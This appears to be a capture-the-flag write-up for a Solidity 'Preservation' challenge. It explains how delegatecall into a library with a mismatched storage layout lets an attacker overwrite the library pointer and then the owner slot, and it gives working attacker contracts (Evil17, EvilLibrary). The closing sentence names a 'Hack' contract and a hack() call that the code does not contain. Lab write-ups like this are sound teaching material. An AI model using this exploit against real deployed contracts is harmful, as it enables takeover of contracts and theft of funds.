### Goals

Claim ownership of contract

### Exploit

When we use delegate call we need to keep in mind that we need to percive storage layout in the contract that we will be delegating to. If the storage layout is not percieved we might mess up the contract. As we can see the `Preservation` has 4 variables, but the `Library` has only 1. Effectively we will overwrite not `storedTime` but `timeZone1Library` since that's the storage order.

So we can call either `setFirstTime` or `setSecondTime` wich will change `timeZone1Library` variable. We can deploy our malicious library and call above function with ours malicious library addresss. In the malicious library address we will perceive the storage layout allowing to modify the owner variable.

### Code

```
contract Evil17 {
    Preservation public target;
    EvilLibrary public evilLib;

    constructor() {
        target = Preservation(PRESERVATION_ADDRESS);
        evilLib = new EvilLibrary();
        target.setFirstTime(uint256(uint160((address(evilLib)))));
        target.setFirstTime(0);
    }
}

contract EvilLibrary {
    // stores a timestamp
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint storedTime;

    function setTime(uint256) public {
        owner = tx.origin;
    }
}
```

We deploy the `Hack` contract and call `hack()` and we claim the ownership of the Preservation.

Done!
